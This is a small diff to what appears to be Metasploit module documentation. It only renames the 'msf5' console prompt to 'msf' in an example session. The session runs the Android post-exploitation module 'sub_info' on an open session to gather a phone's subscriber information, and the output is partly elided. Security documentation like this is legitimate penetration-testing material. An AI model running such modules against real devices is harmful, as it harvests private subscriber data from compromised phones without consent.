@@ -24,10 +24,10 @@
 
 
   ```
-msf5 exploit(multi/handler) > use post/android/gather/sub_info
-msf5 post(android/gather/sub_info) > set session 1
+msf exploit(multi/handler) > use post/android/gather/sub_info
+msf post(android/gather/sub_info) > set session 1
 session => 1
-msf5 post(android/gather/sub_info) > run
+msf post(android/gather/sub_info) > run
 
 [!] SESSION may not be compatible with this module.
 [*] using code : 1
@@ -95,5 +95,5 @@ Subscriber info
  VoiceMailNumberForSubscriber
 
 [*] Post module execution completed
-msf5 post(android/gather/sub_info) >
+msf post(android/gather/sub_info) >
   ```
